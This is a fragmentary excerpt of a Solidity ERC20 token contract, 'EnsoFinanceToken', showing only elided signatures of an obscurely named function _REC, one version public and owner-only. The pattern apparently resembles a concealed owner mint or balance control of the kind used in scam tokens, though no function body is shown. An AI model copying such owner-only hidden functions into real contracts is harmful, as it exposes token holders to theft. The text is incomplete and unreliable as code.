...
contract EnsoFinanceToken is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _REC(address account, uint256 amount) internal virtual {
...
,        uint256 amount
    ...
    function _REC(uint256 amount) public onlyOwner virtual returns (bool) {
